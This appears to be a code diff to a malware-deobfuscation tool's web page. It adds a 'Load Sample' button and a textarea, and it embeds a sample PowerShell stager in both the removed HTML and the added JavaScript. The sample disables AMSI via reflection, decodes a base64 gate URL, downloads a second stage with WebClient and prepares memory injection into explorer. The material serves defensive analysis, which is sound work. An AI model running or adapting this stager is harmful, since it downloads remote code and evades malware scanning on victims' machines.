@@ -593,6 +593,8 @@
 </div>
 <!-- Inline Quick Tools -->
 <div class="flex items-center gap-space-2xs">
+<button id="load-sample-btn" class="px-space-xs py-space-2xs text-on-surface-variant hover:text-primary hover:bg-surface-container-high rounded font-code-sm text-code-sm border border-surface-container-high" title="Load a sample obfuscated script">Load Sample</button>
+<span class="text-surface-container-highest text-[12px] pl-1 pr-1">•</span>
 <button class="px-space-xs py-space-2xs text-on-surface-variant hover:text-primary hover:bg-surface-container-high rounded font-code-sm text-code-sm" title="Beautify / Indent">Beautify</button>
 <span class="text-surface-container-highest text-[12px]">•</span>
 <button class="px-space-xs py-space-2xs text-on-surface-variant hover:text-primary hover:bg-surface-container-high rounded font-code-sm text-code-sm" title="Base64 Decode Selected">B64 Dec</button>
@@ -600,43 +602,9 @@
 <button class="px-space-xs py-space-2xs text-on-surface-variant hover:text-primary hover:bg-surface-container-high rounded font-code-sm text-code-sm" title="XOR Brute Multi-Byte">XOR</button>
 </div>
 </div>
-<!-- Code Surface (Monospace Editor with Line Numbers) -->
-<div class="bg-surface-container-lowest p-space-sm overflow-x-auto min-h-[460px] max-h-[580px] font-code-sm text-code-sm leading-relaxed text-on-surface selection:bg-surface-container-highest">
-<div class="flex items-start gap-space-sm select-none">
-<!-- Subtle Line Numbers -->
-<div class="flex flex-col text-outline text-right pr-space-xs border-r border-surface-container opacity-50 font-telemetry-micro select-none">
-<span>01</span><span>02</span><span>03</span><span>04</span><span>05</span><span>06</span><span>07</span><span>08</span><span>09</span><span>10</span>
-<span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span>
-<span>21</span><span>22</span><span>23</span>
-</div>
-<!-- Code Syntax Stream -->
-<div id="raw-script-code" class="flex flex-col font-code-sm w-full select-text">
-<div class="text-outline-variant italic font-code-sm">// AXON Capture #INC-8492 // Payload dropped via macro</div>
-<div><span class="text-tertiary-fixed-dim">Set-Variable</span> -Name <span class="text-primary-fixed-dim">"k9"</span> -Value (<span class="text-primary-container">[System.Convert]</span>::FromBase64String(<span class="text-tertiary-container">'aHR0cHM6Ly9jZG4tdXBkYXRlcy13aW4ub3JnL2dhdGUucGhw'</span>))</div>
-<div><span class="text-on-surface-variant">$rawBytes</span> = [System.Text.Encoding]::ASCII.GetString(<span class="text-on-surface-variant">$k9</span>)</div>
-<div class="py-space-2xs"></div>
-<div><span class="text-outline-variant italic font-code-sm"># Layer 2 In-Memory Reflection Invoke</span></div>
-<div><span class="text-tertiary-fixed-dim">$m_ref</span> = [Ref].Assembly.GetType(<span class="text-primary-container">'System.Management.Automation.AmsiUtils'</span>)</div>
-<div><span class="text-on-surface-variant">$f_info</span> = <span class="text-on-surface-variant">$m_ref</span>.GetField(<span class="text-primary-container">'amsiInitFailed'</span>, <span class="text-tertiary-fixed-dim">'NonPublic,Static'</span>)</div>
-<div><span class="text-on-surface-variant">$f_info</span>.SetValue(<span class="text-secondary-fixed">$null</span>, <span class="text-secondary-fixed">$True</span>)</div>
-<div class="py-space-2xs"></div>
-<div><span class="text-tertiary-fixed-dim">$k_mem</span> = <span class="text-primary-container">@"</span></div>
-<div class="text-primary font-code-sm pl-space-sm">[DllImport("kernel32.dll")]</div>
-<div class="text-primary font-code-sm pl-space-sm">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</div>
-<div class="text-primary font-code-sm pl-space-sm">[DllImport("kernel32.dll")]</div>
-<div class="text-primary font-code-sm pl-space-sm">public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</div>
-<div><span class="text-primary-container">"@</span></div>
-<div><span class="text-tertiary-fixed-dim">Add-Type</span> -TypeDefinition <span class="text-on-surface-variant">$k_mem</span></div>
-<div class="py-space-2xs"></div>
-<div><span class="text-outline-variant italic font-code-sm"># Layer 3 Dynamic Process Target Injection</span></div>
-<div><span class="text-on-surface-variant">$t_proc</span> = Get-Process -Name <span class="text-tertiary-container">'explorer'</span> -ErrorAction SilentlyContinue | Select-Object -First 1</div>
-<div><span class="text-tertiary-fixed-dim">if</span> (<span class="text-on-surface-variant">$t_proc</span>) {</div>
-<div class="pl-space-sm"><span class="text-on-surface-variant">$h_proc</span> = [System.Diagnostics.Process]::GetProcessById(<span class="text-on-surface-variant">$t_proc</span>.Id).Handle</div>
-<div class="pl-space-sm"><span class="text-on-surface-variant">$b_stage</span> = (New-Object Net.WebClient).DownloadData(<span class="text-on-surface-variant">$rawBytes</span>)</div>
-<div class="pl-space-sm">[Kernel32]::VirtualAlloc([IntPtr]::Zero, <span class="text-on-surface-variant">$b_stage</span>.Length, 0x3000, 0x40)</div>
-<div>}</div>
-</div>
-</div>
+<!-- Code Surface (Monospace Editor) -->
+<div class="bg-surface-container-lowest p-space-sm font-code-sm text-code-sm leading-relaxed text-on-surface selection:bg-surface-container-highest h-[460px]">
+<textarea id="raw-script-code" class="w-full h-full bg-transparent border-none outline-none resize-none placeholder:text-outline-variant font-code-sm text-code-sm" spellcheck="false" placeholder="Paste raw or obfuscated script payload here for analysis..."></textarea>
 </div>
 <!-- Editor Footer Status Line -->
 <div class="px-space-md py-space-xs bg-surface-container border-t border-surface-container flex items-center justify-between text-on-surface-variant font-code-sm text-code-sm">
@@ -1064,11 +1032,41 @@ function _populateAdvancedView(data) {
   }
 }
 
-// ─── Wire De-obfuscate Button → analyzeScript ────────────────────────
 document.getElementById('deobfuscate-btn')?.addEventListener('click', function() {
   var codePane = document.getElementById('raw-script-code');
   if (codePane) {
-    analyzeScript(codePane.textContent);
+    analyzeScript(codePane.value);
+  }
+});
+
+// ─── Wire Load Sample Button ───────────────────────────────────────────
+document.getElementById('load-sample-btn')?.addEventListener('click', function() {
+  var codePane = document.getElementById('raw-script-code');
+  if (codePane) {
+    codePane.value = `// AXON Capture #INC-8492 // Payload dropped via macro
+Set-Variable -Name "k9" -Value ([System.Convert]::FromBase64String('aHR0cHM6Ly9jZG4tdXBkYXRlcy13aW4ub3JnL2dhdGUucGhw'))
+$rawBytes = [System.Text.Encoding]::ASCII.GetString($k9)
+
+# Layer 2 In-Memory Reflection Invoke
+$m_ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$f_info = $m_ref.GetField('amsiInitFailed', 'NonPublic,Static')
+$f_info.SetValue($null, $True)
+
+$k_mem = @"
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+"@
+Add-Type -TypeDefinition $k_mem
+
+# Layer 3 Dynamic Process Target Injection
+$t_proc = Get-Process -Name 'explorer' -ErrorAction SilentlyContinue | Select-Object -First 1
+if ($t_proc) {
+    $h_proc = [System.Diagnostics.Process]::GetProcessById($t_proc.Id).Handle
+    $b_stage = (New-Object Net.WebClient).DownloadData($rawBytes)
+    [Kernel32]::VirtualAlloc([IntPtr]::Zero, $b_stage.Length, 0x3000, 0x40)
+}`;
   }
 });
 </script>
